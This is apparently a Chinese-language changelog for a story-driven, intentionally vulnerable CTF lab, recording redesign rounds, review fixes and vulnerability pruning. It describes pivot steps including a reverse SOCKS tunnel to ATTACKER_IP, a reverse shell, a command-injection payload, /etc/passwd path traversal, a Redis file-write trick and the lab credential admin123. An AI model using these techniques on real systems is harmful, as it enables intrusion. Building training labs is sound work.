使用者的核心意見：「這不要是一個用來駭、用來調查的環境，是一個真環境，只是我們在調查」——換句話說，目前的環境雖然已經有一些填充內容（停車證、印表機缺碳粉等），但份量還是太少，導致玩家找到的東西「幾乎每一筆都有意義」，這本身就會讓人感覺是精心設計過的關卡而不是真的公司/軍方系統。這輪大幅增加跟案件完全無關的雜訊，不是為了增加難度，是為了稀釋訊噪比：

- **webmail 信箱**：從 5 封信（3 條劇情線 + 2 封填充）擴充到 11 封（3 條劇情線 + 8 封填充）：年度合規訓練提醒、電梯故障公告、辦公室閒聊（「今天中午訂便當」）、系統 patch 公告、文具缺貨、承包商門禁暫停通知。刻意跟之前的填充內容（水管維修、印表機缺紙）互相呼應，讓這些瑣事看起來像同一群人在抱怨同一批日常問題，而不是各自獨立的裝飾文字。
- **frontier `/notes/`**：從 4 個檔案增加到 6 個，新增兩份跟停車證通知同等級的純填充（電梯狀態、文具櫃庫存），且內容特地跟 webmail 對應的填充信互相引用（「見同天的 all-staff email」），強化「這是同一個辦公室」的真實感。
- **Dependent Status Index（frontier 搜尋 + relay DB）**：新增三筆完全正常的對照組案例（Marcus Webb / Dana Song / Theo Alvarez，橫跨 Tribute/Coral/Eridanus II 三個殖民地），frontier 跟 relay 兩邊資料一致；relay DB 另外多兩筆只存在內部、不會出現在公開搜尋結果的案例（Nadia Oyelaran、Kenji Park），呼應「內部系統本來就比對外可查的多」這個真實細節。連同已有的 Priya Anand，對照組現在有 4 筆，跟真正異常的 3 筆（Okafor/Wren/Farrow）加 Voight 相比，比例更接近真實案件量的「大多數都沒問題」。
- **relay `service_accounts`**：新增兩筆純死路帳密（會議室預約系統、販賣機庫存回報），跟已有的印表機伺服器一樣是「看起來像線索、其實是死路」的訓練，同時也是很寫實的企業 IT 遺留系統堆積現象。
- **archive SMB shares**：`public` share 新增一份非正式會議紀錄（連時間表都在抱怨），`backups` share 新增一份 2546 年 Q3 的舊預算摘要——刻意放在跟 `casualty_log_partial.txt`、`training_roster_fragment.txt` 同一個資料夾裡，呈現「機密檔案室裡混著無聊行政雜務」這個很真實的細節，而不是每個備份都剛好是重大證據。

全部填充內容都用了跟現有填充內容一致的語氣（瑣碎、有點不耐煩、真實辦公室感），刻意避免寫成明顯裝飾用的空洞句子。

## 第七輪：終局真相重新設計（SPARTAN-II 不再是最終答案）
使用者指出核心問題：「這些孩子被帶去 SPARTAN-II」對熟悉 Halo 的玩家太容易在 Act II 就猜到，等於提早劇透遊戲的最終答案。要求重新設計，讓 SPARTAN-II 維持是 Act III 前半的重大世界觀 reveal，但真正的案件終局是 BLACK ARCHIVE 原創、規模是「一個人、一份被隱藏的紀錄」而不是另一個陰謀。

- **root 文件全部重寫**：`cairn_disposition_review.txt` 不再回答「Petrov 為什麼不銷毀整批資料」（這個問題現在只在 CAIRN record 101 裡簡短交代，作為 Act III reveal 的一部分），改成回答 LONGSHORE 真正委託的具體問題——SPINDLE 除役時的標準檔案檢查把 Farrow（07-B）的低溫懸置單位列入審查清單，Petrov 在正式審查觸發前私自把保管狀態改成「繼續、無需處理」，未經授權跳過審查，因為正式審查會讓 augmentation/訓練/結案三份互不該交叉閱讀的紀錄同時攤開，在戰爭仍在進行的 2547 年讓 acquisition 計畫曝光風險太高。這份文件依然**不解答**07-B 是否存活——三份矛盾來源（casualty log／Kade／低溫轉移授權）維持永遠不解答，root 文件只解釋「這份 30 年前的死亡紀錄為什麼在 2547 年被重新處理過」，這正是玩家從 Act I 開始就在追的那個 transfer_ref 異常的真正成因。
- **LONGSHORE 開場委託信改寫**（`.md` + `.html`）：原本結尾「find out what happened to them」太模糊。改成她已經有一份具體的 migration index 殘存片段，證明 Farrow 的案件在結案數十年後被重新處理過；委託目標改成三個明確問題（誰授權了轉移／原始紀錄送去哪裡／為什麼 Farrow 案在死後三十年被重新開啟），並保留一句更有戲劇性的收尾：「I don't need a theory. I need the record that made them change his file.」同時修掉一個舊 bug——`.md`/`.html` 兩份都寫著「attaching four names」卻只列了三筆，已修正為「three names」。
- **新增 Naomi = LONGSHORE 的可發現證據鏈**（原本只存在開發文件，玩家沒有機會自己推出來）：relay `system_migration_log` 新增一筆由「N. Okafor, Colonial Records Clerk」處理 2547 批次重新索引的紀錄；archive backups share 新增一份通知記錄殘檔，列出「Naomi Okafor」為 Eli 原始案件監護人的全名。兩者都用行政語氣寫成，不強調、不特別標示，細心玩家要自己把姓氏/職務連起來才會推出身分，遊戲仍然不會直接講。
- CAIRN record 101-106 的既有內容全部保留不動——這批文件已經很好地完成「SPARTAN-II 正式揭露」跟「Farrow 三方矛盾」兩個任務，不需要重寫，只是重新定位成「重大 reveal，但不是最終答案」。

## 第八輪：外部技術 review 抓到的真 bug

外部 review（非本專案作者）逐檔比對程式碼跟攻略後回報 6 點，其中 4 點屬實並修正：

- **CAIRN `/dashboard`、`/records/*` 完全沒有 session 驗證（真 bug，嚴重）**：`admin_panel.py` 原本的 `# No session validation (broken authentication)` 注釋是從 VulnCastle 沿用下來的舊漏洞標記，但這輪重新設計 login（username 欄位 SQLi 被堵、要換到 password 欄位）之後，這個舊漏洞變成讓整個新設計形同虛設——不管有沒有登入，直接 `curl /dashboard` 一樣看得到全部六份文件。連攻略本身都在示範這個 bug（`login` 之後另開一個沒帶 cookie 的 `curl /dashboard` 還是成功）。已修正：登入成功（SQLi 或合法密碼皆可）發一個 `cairn_session` cookie，`/dashboard`、`/records/*` 沒帶有效 cookie 一律 302 回首頁。SQLi 本身完全沒被動到——SQLi 成功一樣讓 server 判定登入成功、一樣發 cookie，只是現在真的需要那個 cookie 才能進去。已重新 build+live test 確認：沒 cookie 兩個 endpoint 都 302；帶 SQLi 或合法密碼拿到的 cookie 都能進 dashboard。
- **relay `/api/files` 讀檔路徑寫錯（真 bug，次要功能）**：`server.js` 寫的是 `/opt/api/data/`，但 Dockerfile 實際 `COPY app/api/ /opt/relay/api/`，檔案其實在 `/opt/relay/api/data/`，導致這個次要 endpoint（示範用，非主線）原本一定回 404。已修正路徑，path traversal 效果不受影響，重新 build 確認 `?name=readme.txt` 跟 `?name=../../../../etc/passwd` 都正常。
- **frontier 首頁 Webmail Quick Link 寫死 `localhost:8025`（真 bug，遠端打會連錯機器）**：如果攻擊機跟受害機不是同一台（README 本來就支援這種用法），玩家瀏覽器點這個連結會連回攻擊機自己的 8025，不是受害機的。已改成用 `$_SERVER['HTTP_HOST']`（去掉 port 後重組）動態產生連結。
- **frontier nginx `location /backup/`（真的是 leftover dead config）**：對應的 `/var/www/html/portal/backup/` 從來不存在（真正的 `/backups/` 在檔案系統根目錄，是另一個提權用的路徑，跟這個 nginx location 無關），這個 block 從一開始就是死的、不影響任何攻略路徑。直接刪掉，不做成 alias（避免意外改變 attack surface）。

以下 2 點外部 review 提的不算需要改的 bug，但已經據此加強 `start.sh`/README：

- **README 的 `docker-compose` 安裝指令在部分 Debian/Ubuntu 版本可能只裝到舊版 standalone v1**（`docker compose` 子指令會不存在）。這台 Kali 上實測目前 apt 版本沒有這個問題（`docker-compose` 套件本身就內建 v2 plugin），但其他發行版/版本仍可能踩到，已在 README 加上 `docker compose version` 報錯時的官方 repo 安裝備援指令。
- **`docker compose ps` 顯示三個 container 都 `Up` 不保證裡面用 supervisord 跑的個別服務都活著**（單一 container 裡任何一個服務 crash-loop，container 本身照樣是 `Up`）。`start.sh` 結尾加上對 FRONTIER `:8080`/`:8025`、RELAY `:2222` 這三個真正對外開放的 port 做輪詢檢查；archive 跟 relay 內部服務因為本來就不對 host 開 port，沒辦法從外面測，這正是 pivot 存在的意義，不強行加測。

## 第九輪：外部 review 抓到一個真正傷結構的設計 bug

同一位外部 reviewer 再次逐檔覆盤，這次抓到 3 個「設計層面」bug（不是單純程式碼寫錯），加上 4 個小一致性問題。3 個設計 bug 全部屬實並修正：

- **Critical：ARCHIVE 的 shell access 可以完全跳過 Act III（真 bug，這輪最嚴重的發現）**：`lab/base/Dockerfile` 建立 `sysadmin/admin123`，archive 繼承 base image 又跑 sshd，導致玩家在 RELAY 學到這組密碼後，只要對 `cairn.internal` 做 port scan 看到 22 開著，直接 `ssh sysadmin@cairn.internal` 就能拿 shell，接著照 4.6 節做 PATH hijack 提權、`cat /root/cairn_disposition_review.txt`——SQLi、CAIRN Records Terminal、SMB 三個分享、SPARTAN-II reveal、Kade/Castel/106 三方矛盾全部可以整段跳過，`player-knowledge-states.md` 假設的「root 前應該已經自己拼出 SPARTAN-II」完全不成立。採用 reviewer 建議的修法：**拆開 OS 登入跟 Samba 密碼**，archive 的 sshd 改成 `PasswordAuthentication no`（只有這台，frontier/relay 不受影響），`sysadmin/admin123` 對 archive SSH 完全失效，Samba 繼續吃這組密碼不變。真正能拿 shell 的方法：SMB `confidential` share 裡原本「假的、純 flavor」的 `cairn_backup_key` 現在是一把真的 RSA 私鑰，`authorized_keys` 已經佈好在 archive 的 `sysadmin` 帳號上——玩家必須先進到 confidential share（`sysadmin/admin123`，密碼沒變，只是不能拿去打 SSH 了）才拿得到 shell。不是硬鎖劇情（玩家不用真的讀完 101-106 才能提權），但至少強迫多走一步跟 CAIRN 系統本身的互動，不是純密碼重用的一步到位。已重新 build+完整 live test 全鏈：密碼 SSH 確認被拒（`Permission denied (publickey)`），用 SMB 撈到的 key 確認能登入、能做完整 PATH hijack 提權、能讀到 root 文件。
- **High：遊戲現在是 2555 年，但 FRONTIER 的「現役」介面全部停在 2547（真 bug）**：`timeline.md`/`truth-map.md` 明確定死現在是 2555，但首頁 `LAST LOGIN`、System Notices 公告板、webmail 全部 14 封信都是 2547 年，會讓人覺得是特地做給玩家看的歷史快照，而不是正在運作的系統。**不刪任何 2547 舊信**（那些是劇情需要的歷史 thread）——改成：`LAST LOGIN` 換成 2555-03-19；System Notices 八則全部換成 2555 年的新版本（大部分是原本內容換日期，換掉跟 2547 SPINDLE 直接掛鉤的那一則，換成無關的電梯巡檢公告）；webmail inbox 最上面新增 3 封 2555 年的純填充信（新印表機、Q1 費用報告、消防演習），2547 年的 14 封信原封不動留在下面。信箱總數變成 17 封（4 條劇情線 + 13 填充）。
- **High：Petrov 到底改了什麼，兩份證據互相打架（真 bug）**：第八輪新加的 `cairn_access_log_extract.txt` 原本寫 `i.petrov RECORD_MODIFY 106`——但 106 是 Farrow 的 2525 年低溫轉移授權，root 文件明講「我讀過這三份，不會在這裡寫第四種版本」。`RECORD_MODIFY 106` 等於暗示 106 這份文件的內容被 Petrov 動過，直接跟「三份矛盾來源永遠保持原樣、不解答」的設計原則衝突。已改成 `CUSTODY_STATUS_SET 07-B`，明確是一個獨立的保管狀態欄位被改，不是 106 這份文件本身。同時修正 3 個小地方讓時間線完全一致：`timeline.md` 原本寫「2547-02-12（前後，未正式記錄）」，跟 access log 的 `2547-02-11` 對不起來，已統一成 02-11，並說明 access log 是系統技術性紀錄、不等於「正式授權文書」（root 文件講的「no authorization attached」指的是後者）。

以下順手修的小一致性問題（Medium/Low，不影響主線）：

- root 文件「The records were never moved anywhere. They are exactly where they were left in 2525, on this node」跟 record 101（2547 年 acquisition-era material 才被保留進這個 node）時間/地點矛盾——CAIRN 這個 node 本來就是 2547 SPINDLE decommission 才出現的，不可能東西從 2525 就「一直在這個 node」。改成「2547 migration 已經把這批東西移到能移的最後一步，之後那個往 permanent archive 的 transfer 才是真的沒發生」。
- `backups` share smb.conf 寫 `guest ok = yes, writable = yes`，但 Dockerfile 對 `/srv/share/backups` 只給 `chmod 755`（root 擁有），guest 對應的 unix 使用者實際上寫不進去，跟文件宣稱的「guest 可讀寫」不符。改成 `chmod 777`，跟 `public` share 一致，重新 build 確認 guest 真的能 put/del 檔案。
- walkthrough Act I 的 `nmap -p- TARGET` 預期輸出寫「80/tcp」，但 TARGET 是 docker host、host port 映射是 8080，而且 RELAY 的 2222/ssh 也會在同一次掃描裡出現。已修正成 8080/tcp + 8025/tcp + 2222/tcp，並註明 2222 是 RELAY 的、不是 frontier 自己的服務。

以下 1 點 reviewer 明確標注「不算 bug，你的取捨」，維持原樣不動：webmail `/inbox` 沒有 session 驗證，玩家可以不找密碼直接 GET 進去看到 DB root 密碼等內容——這是既有攻略文件已經寫明的刻意保留漏洞，不是遺漏。

## 第十輪：RELAY 不再對外開 SSH port（架構真實感修正，接受難度變高）

原本的架構有一個「lab 感」的破綻：三台 host 概念上是 FRONTIER → RELAY → ARCHIVE 依序 pivot，但 `docker-compose.yml` 把 RELAY 的 SSH（`2222:22`）也映射到宿主機，跟 FRONTIER 的 `8080`/`8025` 一樣直接對攻擊機開放。結果第一次 `nmap -p- TARGET` 就會同時看到 RELAY 的 SSH，從攻擊者視角比較像「一台 server 開三個 port」而不是「打進 FRONTIER 才發現後面還有一台 RELAY」，跟 ARCHIVE 已經做到的「完全不映射 port、必須真的 pivot」不一致。

**這是使用者自己發現並主動提出的**（不是外部 code review），並且在提出時已經預期並接受「Act II 會變難」這個 tradeoff，明確要求動手改。

修法：
- `docker-compose.yml` 移除 `relay` 的 `ports: - "2222:22"`，其餘網路設定（dmz/internal 雙掛、`cap_add: NET_ADMIN`）不變。RELAY 現在跟 ARCHIVE 一樣，完全不對宿主機開任何 port。
- 玩家現在必須先在 FRONTIER 拿到執行權限（upload polyglot 或 ping injection），把一次性的 webshell 升級成真正的互動式 shell（bash reverse shell 回自己的 nc listener，再用 `python3 -c 'import pty; pty.spawn("/bin/bash")'` 升級 TTY），才能在這個真終端機裡對 `172.20.1.12`（RELAY 的 dmz IP，跟 FRONTIER 同網段，container 間互通不需要額外設定）打 `ssh sysadmin@172.20.1.12`，密碼還是原來的 `admin123`——這組密碼重用本身完全沒變，變的只是「怎麼把這組密碼用出去」。
- ARCHIVE 那一段（原本靠 `ssh -p 2222 sysadmin@TARGET -L ...` 直接從攻擊機把 port 轉發到自己本機）也連帶失效，因為攻擊機再也無法直接對 RELAY 起一個 ssh 連線。改成：在已經拿到的 RELAY shell 裡開一個反向 dynamic SOCKS 轉發回攻擊機自己的 sshd（`ssh -R 1080 <帳號>@ATTACKER_IP -N`），讓攻擊機本機出現一個 SOCKS proxy，背後走的是 RELAY 的網路視角；接下來攻擊機自己的 `smbclient`/`curl`/`ssh`（拿 `cairn_backup_key` 登入 ARCHIVE 那一步也一樣）全部透過 `proxychains4` 打。這正好是原本就裝在 RELAY 上、但一直沒有真正被用到的 `proxychains4` 套件的用途——之前的設計裡它形同虛設，這輪修正後才變成玩家真正會用到的工具。
- 這個改動不影響 RELAY/ARCHIVE 內部的任何漏洞機制、憑證、文件內容——只改變「怎麼連進去」，不改變「連進去之後看到什麼」。已重新 `docker compose build --no-cache && docker compose up -d` 完整 rebuild，並實測驗證：外部 `nmap -p 22,2222,8080,8025 TARGET` 確認只剩 8080/8025 開放；從 FRONTIER 的 www-data webshell 確認能直連 `172.20.1.12:22`；用完整互動式 shell 實測 `ssh sysadmin@172.20.1.12` 密碼登入成功；RELAY 對 `cairn.internal` 的既有內部路由（`/etc/ledger/sync.conf`、LEDGER API）全部沒受影響。

更新的文件：`docker-compose.yml`、`start.sh`（移除已經打不到的 `check_port localhost 2222`）、`README.md`（更新對外開放 port 的說明）、`story-dev/attack_chain_design.md`（§0 架構圖、§2.1 recon 預期輸出、§3.1 憑證重用改成 pivot 步驟、§3.2 API 存取路徑、§4.1/§4.2/§4.2b 全部改成走 `proxychains4` + 反向 SOCKS）、`Answer/walkthrough.md`（步驟 1、8、9、13、14、16、17、20，補上真正的 pivot/TTY 升級/SOCKS 步驟）。

## 第十一輪：RELAY/FRONTIER 兩個 optional privesc 改得更真實（不再靠檔名/權限位數字一眼看穿）

這輪是使用者主動提出的兩個小修正，都屬於「這兩條 optional privesc 分支本身沒問題，但外觀太像 CTF 教科書範例，不夠真實」的調整——**漏洞機制、需要的 enumeration 步驟數量都沒變**，只是把「一看就知道是漏洞」的表面特徵換成更貼近真實世界誤設的樣子。這兩條本來就標記「非主線必經」，改動後仍然不影響任何主線 gating。

- **RELAY：`python3-suid` → `spindle-legacy-diag`**。原本這個 SUID binary的名字直接寫著「這是被 SUID 過的 python3」，等於把答案寫在檔名上，玩家不用理解漏洞、只要看到檔名就知道怎麼打（`<name> -c '...'`）。現在改名成 `/usr/local/bin/spindle-legacy-diag`，敘事上是 SPINDLE 那個年代留下的診斷工具，原始的 wrapper script 早就沒了，只剩被 SUID 過的直譯器本體沒人清掉——這跟 CAIRN、`/etc/ledger/sync.conf` 這些「舊系統遺留物」的敘事調性一致。底層其實還是原封不動的 `/usr/bin/python3`，`find / -perm -4000` 還是會照樣列出來，玩家一樣要自己想到「這其實是個直譯器，可以拿來執行任意 Python」才會打得動——只是不能單靠檔名字面猜答案了。
- **FRONTIER：`/opt/backup.sh` 從 `chmod 777` 改成群組寫入**。原本 world-writable（`chmod 777`）是最沒有真實感的誤設——真實環境幾乎不會有人把一個 root cron 腳本設成全世界可寫，這種設定本身就是「這裡有漏洞」的活廣告，`find / -perm -002` 一行指令就會把答案送到眼前。改成：新增一個 `ops` 群組，`www-data` 被加進這個群組（敘事：早年 portal 曾經有一個「立即觸發備份」的管理員按鈕，需要 www-data 能手動跑這個腳本，功能後來拿掉了，群組成員資格跟腳本的群組寫入權限沒人記得收回），`/opt/backup.sh` 變成 `root:ops 770`。玩家要先用 `id` 注意到自己在一個叫 `ops` 的群組裡，才會想到去查這個群組對哪些檔案有寫入權，不是單純掃「全世界可寫的檔案」就會自動冒出來。
- 已重新 `docker compose build --no-cache frontier relay` 完整 rebuild 並實測兩條路徑：webshell 的 `id` 確認 `www-data` 正確帶有 `ops` 補充群組（php-fpm 有正確做 supplementary group 初始化，不是只有 primary group）、覆寫 `/opt/backup.sh` 後等 root cron 執行拿到 SUID root shell；RELAY 那邊 `find / -perm -4000` 確認 `spindle-legacy-diag` 會被列出來，執行後確認 `os.setuid(0)` 拿到 `uid=0(root)`。兩條都跟改動前的漏洞機制完全一致，只是外觀更真實。

更新的文件：`lab/relay/Dockerfile`、`lab/frontier/Dockerfile`、`story-dev/attack_chain_design.md`（§3.5、附錄 A 兩個 host 的提權欄位）。

## 第十二輪：全鏈路外部稽核——找到並修掉「攻擊鏈外」的真 root 捷徑

使用者在第十一輪改完之後，明確要求「檢查能不能正常跑完整條攻擊鏈、有沒有在攻擊鏈外的漏洞、修好它、檢查連帶要改的文件」。這輪不是改敘事/難度，是把三台 host 從頭 `docker compose down && build --no-cache && up` 之後，重新走一次完整攻擊鏈，同時系統性檢查有沒有意外的、不在設計範圍內的捷徑。找到 3 個真的問題，嚴重程度由高到低：

- **Critical：RELAY 的 LEDGER API（`server.js`）本來是用 root 身份跑的，而且它的 command injection（`/api/diagnostics`）從 FRONTIER 的網段位置就能直接打到，完全不需要先拿到 SSH。** 三個 host 的 supervisord.conf 裡，`[program:webmail]`（frontier）、`[program:ledger-api]`（relay）、`[program:cairn-admin]`（archive）都沒有寫 `user=` 這一行——supervisord 本身是 PID 1、以 root 執行，沒有明確指定 `user=` 的子程式一律原封不動繼承 root 身分執行。這三個都是純 Python/Node 寫的 HTTP server，沒有自己做任何 setuid/drop privilege。實測驗證：從 frontier 已經拿到的 www-data webshell 直接對 `172.20.1.12:3000/api/diagnostics` 打 command injection payload（`{"target":"a; id"}`），修之前會直接拿到 relay 的 root shell——等於玩家在**完全還沒碰過 webmail、還沒做密碼重用、還沒 SSH 進 relay** 的階段，就能繞過整個 Act II 設計直接拿到 relay root。這是這輪稽核裡最嚴重的發現，比任何刻意設計的 privesc 節點都更容易踩到，因為它不需要本機 shell，只需要網路可達。修法：三個 supervisord.conf 都加上 `user=www-data`，讓這三個 app 跟它們原本就該有的權限（跟拿到 www-data webshell 一樣的等級）一致，不再是 root。實測修完後同一個 payload 回傳 `uid=33(www-data)`。
- **High：ARCHIVE 的 Redis（無認證、網路可達）本來也是用 root 跑的。** `[program:redis]` 同樣沒有 `user=`。Redis 本來就是刻意設計成「無認證的次要目標」，如果它是 root，理論上就有經典的「`CONFIG SET dir` + `SAVE` 寫任意檔案」技巧可以嘗試繞過本來設計好的 PATH-hijack，直接從 relay 對 `cairn.internal:6379` 打就能碰到，完全不需要 SMB/SSH key 那條路。實測兩種常見變體（寫進 `/etc/cron.d/`、直接覆寫 `/opt/staging/logtool`）在這個環境目前都沒有真的打穿（一個被 cron 的格式驗證擋掉、一個因為 Redis 寫出來的檔案沒有執行位元），但這是這個特定 cron/Redis 版本組合剛好擋住，不是這個設計本身安全——修法一樣是加 `user=redis`（apt 裝 redis-server 時其實已經內建一個 `redis` 系統帳號跟屬主正確的 `/var/lib/redis`，只是 supervisord 沒有用到它），把攻擊面從「網路可達就可能直接 root」收斂回「就是一個無認證、能讀能寫 DB 內容的次要目標」，跟文件裡原本描述的定位一致。
- **Medium：所有用 `COPY` 進容器的檔案（app 原始碼、`nginx.conf`、`smb.conf`、`supervisord.conf`……）權限完全繼承 build context 當下的檔案 mode，而不是寫在 Dockerfile 裡的固定值。** `COPY` 不會主動 normalize 權限，如果 build 那台機器的 umask 剛好比較寬鬆，COPY 進去的檔案就會是寬鬆的權限——這次在自己的測試環境就實際踩到：所有 COPY 進去的檔案全部變成 `rw-rw-rw-`（666），包括 `/etc/supervisor/conf.d/*.conf`（root 讀的）、`/etc/nginx/sites-available/default`、`/etc/samba/smb.conf`，還有三個 app 的原始碼本身。前三個是 root 常駐 process 會讀的設定檔——一旦某個 host 上已經有一個低權限 shell（不管是不是刻意設計的路徑），就可以直接改這些設定檔，等下一次 container 重啟（例如 crash 或管理者 `docker compose restart`）時取得 root，等於在「刻意設計的提權路徑」旁邊留了一條完全繞過的後門，不受任何 umask 之外的因素保護。修法：在每個 Dockerfile 的 COPY 之後都明確 `chown root:root` + `chmod 644`（目錄 755），不依賴 build 環境的 umask，只保留原本就刻意寫死的寬鬆權限（`uploads/` 777、`backup.sh` 770、confidential/backups 內的檔案 644、`cairn_backup_key`/`authorized_keys` 該有的窄權限……全部維持原樣）。ARCHIVE 的 `/opt/admin/` 額外處理：這個目錄需要讓（現在跑在 www-data 底下的）`cairn-admin` 在第一次啟動時自己建立 `admin.db`，所以目錄本身設成 `root:www-data 1775`（group-writable + sticky bit），`app.py`/`assets/` 仍然是 `root:root`、sticky bit 讓 www-data 沒辦法刪除或替換它們，只能在目錄裡新增自己的 db 檔案。

三個修法都已經 `docker compose down && build --no-cache && up` 完整重建三台 host，並重新走了一次**完整攻擊鏈**驗證沒有任何既有功能被影響：FRONTIER 全端口掃描/搜尋/notes 洩漏/upload polyglot/ping injection/webmail debug 洩漏 → pivot 進 RELAY（reverse shell + TTY 升級 + ssh 密碼重用）→ LEDGER API/MariaDB/`sync.conf` → 反向 SOCKS + proxychains 進 ARCHIVE → SMB 三個分享 → `cairn_backup_key` key-only SSH → CAIRN Records Terminal（SQLi 換欄位 + 合法帳密兩條都測）→ 六份文件 → PATH-hijack 拿 root → 讀到 `cairn_disposition_review.txt`。FRONTIER 自己的兩條 optional privesc（`sudo find` NOPASSWD、`ops` 群組 `backup.sh`）跟 RELAY 的 `spindle-legacy-diag` 也都重新驗證過一次，跟第十一輪的結果一致，沒有因為這輪的權限鎖死而失效。

更新的文件：`lab/frontier/Dockerfile`、`lab/frontier/config/supervisord.conf`、`lab/relay/Dockerfile`、`lab/relay/config/supervisord.conf`、`lab/archive/Dockerfile`、`lab/archive/config/supervisord.conf`。設計文件（`attack_chain_design.md`、`walkthrough.md`）不需要改——這些都是「不該存在的捷徑」，不是文件裡描述過的任何路徑，本來就沒有寫進任何攻略。

## 第十三輪：使用者要求「一條攻擊鏈，不要多餘漏洞」——大規模砍掉冗餘/無回報的漏洞

使用者對第十一/十二輪的成果反饋是「感覺漏洞太多」，明確要求：**保留一條完整的攻擊鏈，加上其他可以拿到更多額外資訊的漏洞；如果兩個漏洞拿到一樣的東西，砍到剩一個；不要兔子洞**（打得穿但拿不到任何東西、也不是往下一關必經的漏洞）。這輪把這個標準套用到三台 host，逐一砍，不是「隨便挑幾個刪掉湊數」。

判斷標準統一寫成兩條規則：
1. **兩個漏洞如果拿到一樣的東西（同一個 shell 等級、同一份資料），只留一個。**
2. **一個漏洞如果打穿之後沒有任何新資訊、也不是往下一關的必經路，直接砍——不當「反正留著也沒差」的裝飾。**

逐台檢查結果：

- **FRONTIER**：
  - 立足點原本「三選一」（upload / ping command injection / notes LFI）全部拿到 www-data，是同一個東西——依規則 1 只留 **upload**（`getimagesize()` magic-byte bypass，本身就是三條裡技術含量最高、最不容易 enumerate 出來的一條）。`ping` 的 command injection、`notes` 的 path traversal、`search` 的 reflected XSS 全部**真的修掉**（不是拿掉頁面，是把底層漏洞修對：`ping` 改用 `escapeshellarg()` + hostname 格式驗證、`notes` 用 `basename()` 擋掉 `../`、`search` 補上 `htmlspecialchars()`），三個頁面本身還在，只是不再是漏洞——不是删掉功能，是把「示範用的洞」清掉。
  - 本機提權原本兩條（`sudo -l` NOPASSWD find、`ops` 群組寫入 `/opt/backup.sh`）——依規則 2 直接砍：文件裡本來就寫明「root 在 frontier 解鎖不了任何東西」，兩條路打穿了都沒有任何回報，是純粹的兔子洞。`ops` 群組、`/opt/backup.sh`、`sudo` NOPASSWD 這三個機制從 Dockerfile 整段移除。
- **RELAY**：
  - LEDGER API 原本除了核心的 `/api/cases`（IDOR）、`/api/health`（洩漏 `cairn.internal`）之外，還有 `/api/fetch?url=`（SSRF）、`/api/diagnostics`（command injection）、`/api/files?name=`（path traversal）三個「示範用」的洞——依規則 2 全部砍：SSRF/path traversal 拿到的資訊跟 `/api/health` 重複，command injection 在第十二輪修 supervisord 的 root 執行問題之前，甚至是一條從 FRONTIER 就能直接打、完全不用先拿 relay shell 的意外 root 捷徑（見第十二輪）。三個 endpoint 連同對應的 `readme.txt` data 檔一起從 `server.js` 刪除。
  - 本機提權（SUID `spindle-legacy-diag`）——依規則 2 直接砍，理由跟 frontier 一樣：root 在 relay 解鎖不了任何東西（`/etc/ledger/sync.conf` 本身就是 644，`sysadmin` 就讀得到）。
- **ARCHIVE**：
  - CAIRN Records Terminal 登入原本雙路徑（SQLi 換到 password 欄位 / 合法帳密），兩條拿到完全一樣的 session/dashboard——依規則 1 只留**合法帳密**這一條（因為它本身就跟 3.3b 節的 `sync.conf` credential discovery 掛鉤，是主線必經，SQLi 只是額外的捷徑）。做法是把 `admin_panel.py` 的 SQL 查詢改成參數化查詢（`?` placeholder），SQLi 完全消失，合法登入的功能不變。
  - Redis（無認證、網路可達）——依規則 2 直接砍：檢查過整個程式碼，沒有任何地方真的往 Redis 讀寫過東西，`service_accounts` 裡的「CAIRN Cache」那筆本身也寫著 `(無)/(無)`，玩家連上去除了「這是一個無認證的服務」之外什麼都拿不到，是純粹的兔子洞（也是第十二輪才剛花力氣把它的 root 執行問題修掉的服務——但修完之後重新評估，發現它本來就不該存在）。整個 Redis 服務從 archive 的 Dockerfile、supervisord.conf 移除，`service_accounts` 表跟 `/api/health` 裡對應的引用也一起清掉。

**主線本身完全沒有變動**——FRONTIER 的 credential 洩漏鏈、RELAY 的 transfer_ref/MariaDB/sync.conf 鏈、ARCHIVE 的 SMB/backup key/PATH-hijack/最終文件全部原封不動。這輪砍的都是文件裡早就標記「示範/次要/非主線必經」的東西，跟主線劇情、證據鏈毫無關係。

已重新 `docker compose down && build --no-cache && up` 完整重建三台 host，並重新走了一次**完整攻擊鏈**確認沒有任何主線功能受影響，同時逐一確認每個「砍掉」的東西真的不在了：外部 `nmap` 確認 `6379` 已關閉；`search`/`notes`/`ping` 三個頁面用原本的 payload 測試，全部確認不再可利用，但頁面本身功能正常（ping 還能正常 ping、notes 還能正常讀檔、search 還能正常搜尋，只是輸出有跳脱）；FRONTIER webshell 確認 `sudo -l` 空白、`/opt/backup.sh`/`ops` 群組都不存在；RELAY 確認 `find / -perm -4000` 不再列出任何自訂 SUID 檔案、LEDGER API 的 `/api/diagnostics` 回 404；ARCHIVE 確認 CAIRN 登入的 SQLi payload 回 200（拒絕）而合法帳密回 302（成功）。最後完整重跑一次 FRONTIER→RELAY→ARCHIVE→CAIRN→PATH-hijack→root file 全鏈，`euid=0(root)` 跟 `cairn_disposition_review.txt` 都確認讀到。

更新的文件：`lab/frontier/app/portal/index.php`（XSS/LFI/ping 三個漏洞修掉，功能保留）、`lab/frontier/Dockerfile`（移除 `ops`/`backup.sh`/`sudo` NOPASSWD）、`lab/relay/app/api/server.js`（移除 SSRF/command injection/path traversal 三個 endpoint，刪掉 `data/readme.txt`）、`lab/relay/Dockerfile`（移除 `spindle-legacy-diag`）、`lab/relay/sql/init.sql`（移除 CAIRN Cache 那筆）、`lab/archive/app/admin/admin_panel.py`（SQLi 改參數化查詢）、`lab/archive/Dockerfile`（移除 Redis）、`lab/archive/config/supervisord.conf`（移除 `[program:redis]`）、`story-dev/attack_chain_design.md`（§1 新增原則 7、§2.2/2.3、§3.2/3.3/3.5、§4.3、附錄 A 全部同步）、`Answer/walkthrough.md`（移除步驟 6 Ping，其餘全部重新編號 1-21，CAIRN 登入步驟移除 SQLi）、`story-dev/player-knowledge-states.md`/`timeline.md`/`characters.md`（三處提到 SQLi/Redis 的字句同步修掉）。`story-dev/legacy-mechanics.md` 維持凍結，不更新——那份文件本來就是「原始 VulnCastle 機制」的歷史記錄，不是目前實際漏洞集合的說明。

## 第十四輪：Act I 補一個推理節點，讓「資安」跟「邏輯推理」比重打平

使用者反饋：漏洞/資安素材維持現狀就好（第十三輪剛砍完，不要再動），但覺得**推理內容前半段（Act I）份量太少**，希望資安跟邏輯推理兩邊比重相當。現況確實不平衡：Act II 有一個推理節點（3.4 節，官方稽核 vs 自己查到的證據）、Act III 有三個（4.4/4.5/4.5b），Act I 完全沒有——玩家在 FRONTIER 階段純粹是技術性 enumeration（找立足點、找密碼），沒有任何需要自己下判斷的節點。

